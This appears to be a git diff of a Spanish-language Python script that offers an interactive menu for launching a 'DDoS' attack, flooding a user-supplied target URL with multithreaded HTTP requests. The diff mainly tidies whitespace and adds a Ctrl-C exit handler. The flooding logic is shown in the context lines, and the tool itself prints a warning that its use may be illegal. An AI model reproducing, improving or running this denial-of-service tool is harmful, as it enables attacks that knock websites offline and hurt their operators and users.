@@ -4,10 +4,12 @@ import os
 import requests
 import threading
 import time
+import signal
+import sys
 
 ROJO = '\033[91m'
 VERDE = '\033[92m'
-RESET = '\033[0m'  
+RESET = '\033[0m'
 
 def limpiar_pantalla():
     os.system('clear')
@@ -25,11 +27,11 @@ o888bood8P'   o888bood8P'    `Y8bood8P'  8""88888P'
 
 def mostrar_menu():
     mostrar_banner()
-    print()  
+    print()
     print(VERDE + "=== Menú Principal ===" + RESET)
     print(VERDE + "1. DDoS" + RESET)
     print(VERDE + "2. Salir" + RESET)
-    print(VERDE + "=" * 20 + RESET)  
+    print(VERDE + "=" * 20 + RESET)
 
 def enviar_solicitud(url):
     try:
@@ -48,8 +50,7 @@ def prueba_ddos(url, num_solicitudes, hilos):
     tiempo_inicio = time.time()
     for _ in range(num_solicitudes // hilos):
         for hilo in lista_hilos:
-            hilo.join()  
-    
+            hilo.join()
             hilo = threading.Thread(target=enviar_solicitud, args=(url,))
             lista_hilos.append(hilo)
             hilo.start()
@@ -58,20 +59,19 @@ def prueba_ddos(url, num_solicitudes, hilos):
     print(f"Tiempo total: {tiempo_final - tiempo_inicio} segundos")
 
 def opcion_ddos():
-    limpiar_pantalla()  
+    limpiar_pantalla()
     mostrar_banner()
-    
-    print() 
+
+    print()
     print(ROJO + "ADVERTENCIA: Esta acción podría ser ilegal y tiene consecuencias serias." + RESET)
 
-    print() 
-    url = input(VERDE + "Ingresa la URL objetivo: " + RESET) 
-    num_solicitudes = int(input(VERDE + "Número de solicitudes: " + RESET))  
-    hilos = int(input(VERDE + "Número de hilos: " + RESET))  
+    url = input(VERDE + "Ingresa la URL objetivo: " + RESET)
+    num_solicitudes = int(input(VERDE + "Número de solicitudes: " + RESET))
+    hilos = int(input(VERDE + "Número de hilos: " + RESET))
 
     confirmacion = input(VERDE + "¿Estás seguro de continuar? (s/n): " + RESET)
     if confirmacion.lower() == 's':
-        limpiar_pantalla()  # Limpiar pantalla antes de ejecutar el ataque
+        limpiar_pantalla()
         print(ROJO + "Ejecutando opción de DDoS..." + RESET)
         prueba_ddos(url, num_solicitudes, hilos)
     else:
@@ -79,22 +79,27 @@ def opcion_ddos():
 
     input(VERDE + "Presiona 1 para volver al menú: " + RESET)
 
+def manejar_salida(signal, frame):
+    print(VERDE + "\nHasta la próxima." + RESET)
+    sys.exit(0)
+
 def main():
+    signal.signal(signal.SIGINT, manejar_salida)
     while True:
-        limpiar_pantalla()  # Limpiar la pantalla antes de mostrar el menú
+        limpiar_pantalla()
         mostrar_menu()
-     
+
         opcion = input(VERDE + "Selecciona una opción (1-2): " + RESET)
 
         if opcion == '1':
-            limpiar_pantalla()  # Limpiar la pantalla antes de la opción DDoS
+            limpiar_pantalla()
             opcion_ddos()
         elif opcion == '2':
-            limpiar_pantalla()  # Limpiar pantalla antes de salir
+            limpiar_pantalla()
             print(VERDE + "Saliendo..." + RESET)
             break
         else:
             print(ROJO + "Opción no válida. Por favor, intenta de nuevo." + RESET)
 
-if __name__ == "__main__": 
+if __name__ == "__main__":
     main()
